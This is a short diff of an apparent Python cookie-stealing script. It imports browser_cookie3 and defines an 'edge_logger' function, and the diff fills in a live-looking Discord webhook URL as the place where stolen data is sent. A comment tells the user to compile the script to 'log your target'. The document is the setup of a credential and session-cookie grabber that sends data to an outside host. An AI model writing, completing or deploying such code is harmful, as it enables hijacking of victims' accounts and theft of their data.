@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-webhook = "" # Webhook here and make sure to compile if you wanna log your target
+webhook = "https://discord.com/api/webhooks/943885592050147359/738uHG-AZzcgtCxS0-m_6iz7ZqVzycfPdJ6JjCbWrAtTnTUkCDPfXdSMmwcA7wLfUncO" # Webhook here and make sure to compile if you wanna log your target
 
 def edge_logger():
     try:
